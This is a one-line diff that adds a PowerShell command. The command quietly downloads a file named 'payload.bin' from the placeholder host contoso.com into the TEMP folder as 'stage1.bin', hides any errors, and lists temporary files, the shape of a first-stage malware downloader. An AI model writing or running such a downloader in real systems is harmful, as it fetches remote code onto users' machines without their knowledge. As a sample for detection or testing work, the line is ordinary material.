@@ -1,0 +1,1 @@
+$DownloadUrl = 'http://contoso.com/payload.bin'; $DownloadPath = "$env:TEMP\stage1.bin"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
